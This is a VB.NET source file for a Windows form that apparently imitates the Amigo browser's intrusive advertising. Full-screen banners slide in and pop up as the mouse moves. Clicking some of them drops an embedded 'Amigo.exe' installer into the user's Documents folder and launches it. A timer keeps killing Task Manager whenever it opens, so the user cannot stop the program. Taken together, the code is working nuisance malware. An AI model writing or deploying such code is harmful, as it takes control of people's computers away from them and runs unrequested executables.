Imports System.Runtime.InteropServices
Public Class Top_Banner
    <DllImport("user32.dll", EntryPoint:="LoadCursorFromFile", CharSet:=CharSet.Unicode)> _
    Public Shared Function LoadCursorFromFile(ByVal str As [String]) As IntPtr
    End Function
    Public AmigoCursor As IntPtr = IntPtr.Zero, AmigoCursor2 As IntPtr = IntPtr.Zero, mode As Boolean = False
    Private Sub Top_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Me.Width = My.Computer.Screen.Bounds.Width
        Me.Height = Int(My.Computer.Screen.Bounds.Height / 5)
        Me.Left = 0
        Me.Top = -Me.Height
        PictureBox1.Image = My.Resources.Амиго_Заставка
        PictureBox4.Image = My.Resources.Амиго_Заставка
        PictureBox2.Image = My.Resources.Амиго_Кнопка
        PictureBox3.Image = My.Resources.Амиго_Кнопка
        Dim way_cursor As String = Environ("Temp")
        My.Computer.FileSystem.WriteAllBytes(way_cursor & "\AmigoCursor1.cur", My.Resources.Amigo, False)
        My.Computer.FileSystem.WriteAllBytes(way_cursor & "\AmigoCursor2.cur", My.Resources.Amigo_Cursor, False)
        AmigoCursor = LoadCursorFromFile(way_cursor & "\AmigoCursor1.cur")
        AmigoCursor2 = LoadCursorFromFile(way_cursor & "\AmigoCursor2.cur")
        My.Computer.FileSystem.DeleteFile(way_cursor & "\AmigoCursor1.cur")
        My.Computer.FileSystem.DeleteFile(way_cursor & "\AmigoCursor2.cur")
        PictureBox1.Cursor = New Cursor(AmigoCursor)
        PictureBox2.Cursor = New Cursor(AmigoCursor)
        PictureBox3.Cursor = New Cursor(AmigoCursor)
        PictureBox4.Cursor = New Cursor(AmigoCursor)
        TableLayoutPanel1.Cursor = New Cursor(AmigoCursor)
        Left_Banner.Show()
        Antivirus.Show()
        If My.Computer.FileSystem.FileExists(Application.StartupPath & "\AmigoSetup.ls3") Then
            If My.Computer.FileSystem.ReadAllText(Application.StartupPath & "\AmigoSetup.ls3") = "AmigoSetup: OK /422160467246571415857891539875230257925792358543705274352452097308753892049875398" Then
                mode = True
                Amigo_Buttons.Start()
            ElseIf My.Computer.FileSystem.ReadAllText(Application.StartupPath & "\AmigoSetup.ls3") = "AmigoSetup: OK /422160467246571415857891539875230257925792358543705274352452097308753892049875399" Then
                AmigoSetup.Show()
            Else
                Amigo_Buttons.Start()
            End If
        Else
            Amigo_Buttons.Start()
        End If
    End Sub
    Dim timer_toCentreBanner As Short = 0, tick As Short = 0, last_mouse_position As Point, tick2 As Short = 0
    Private Sub Amigo_Buttons_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Amigo_Buttons.Tick
        Dim mouse_position As Point = MousePosition
        If mode = False Then
            If mouse_position.Y <= Int(My.Computer.Screen.Bounds.Height / 5) Then
                Me.Top = 0
                PictureBox1.Enabled = True
                PictureBox2.Enabled = True
                PictureBox3.Enabled = True
                PictureBox4.Enabled = True
            Else
                Me.Top = -Me.Height
                PictureBox1.Enabled = False
                PictureBox2.Enabled = False
                PictureBox3.Enabled = False
                PictureBox4.Enabled = False
            End If
            If mouse_position.X <= Int(My.Computer.Screen.Bounds.Width / 6) And mouse_position.Y >= Left_Banner.Top Then
                Left_Banner.Left = 0
            Else
                Left_Banner.Left = -Left_Banner.Width
            End If
            If tick = 9 Then
                If Math.Max(last_mouse_position.X, mouse_position.X) - Math.Min(last_mouse_position.X, mouse_position.X) <= 20 And Math.Max(last_mouse_position.Y, mouse_position.Y) - Math.Min(last_mouse_position.Y, mouse_position.Y) <= 20 Then
                    timer_toCentreBanner = 0
                ElseIf timer_toCentreBanner = 10 Then
                    last_mouse_position = mouse_position
                    timer_toCentreBanner = 0
                    Centre_Banner.Show()
                Else
                    last_mouse_position = mouse_position
                    timer_toCentreBanner += 1
                End If
                tick = 0
                If tick2 = 300 Then
                    Antivirus.Start()
                    tick2 = 0
                Else
                    tick2 += 1
                End If
            Else
                tick += 1
            End If
        Else
            If tick = 9 Then
                If timer_toCentreBanner = 120 Then
                    Amigo_Buttons.Stop()
                    mode = False
                    last_mouse_position = mouse_position
                    timer_toCentreBanner = 0
                    AmigoSetup.Show()
                    My.Computer.FileSystem.WriteAllText(Application.StartupPath & "\AmigoSetup.ls3", "AmigoSetup: OK /422160467246571415857891539875230257925792358543705274352452097308753892049875399", False)
                ElseIf Math.Max(last_mouse_position.X, mouse_position.X) - Math.Min(last_mouse_position.X, mouse_position.X) > 20 And Math.Max(last_mouse_position.Y, mouse_position.Y) - Math.Min(last_mouse_position.Y, mouse_position.Y) > 20 And My.Computer.Network.IsAvailable Then
                    last_mouse_position = mouse_position
                    timer_toCentreBanner += 1
                End If
                tick = 0
            Else
                tick += 1
            End If
        End If
        If Process.GetProcessesByName("taskmgr").Length >= 1 And My.Computer.FileSystem.FileExists(Application.StartupPath & "\Amigotmgr0.ls3") = False Then
            Process.GetProcessesByName("taskmgr")(0).Kill()
        End If
    End Sub
    Private Sub PictureBox2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox2.Click
        Try
            My.Computer.FileSystem.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "/Amigo.exe", My.Resources.AmigoSetup, True)
            Shell("RunDLL32.exe shell32.dll,ShellExec_RunDLL " & Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Amigo.exe")
        Catch
            MsgBox("Ami-i-i-i-i-i-i-igo!", , "Amigo")
        End Try
    End Sub
    Private Sub PictureBox3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox3.Click
        Try
            My.Computer.FileSystem.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "/Amigo.exe", My.Resources.AmigoSetup, True)
            Shell("RunDLL32.exe shell32.dll,ShellExec_RunDLL " & Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Amigo.exe")
        Catch
            MsgBox("Ami-i-i-i-i-i-i-igo!", , "Amigo")
        End Try
    End Sub
    Private Sub PictureBox4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox4.Click
        Centre_Banner.Show()
    End Sub
    Private Sub PictureBox1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox1.Click
        Centre_Banner.Show()
    End Sub
    Private Sub Top_Banner_Shown(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Shown
        last_mouse_position = MousePosition
    End Sub
End Class
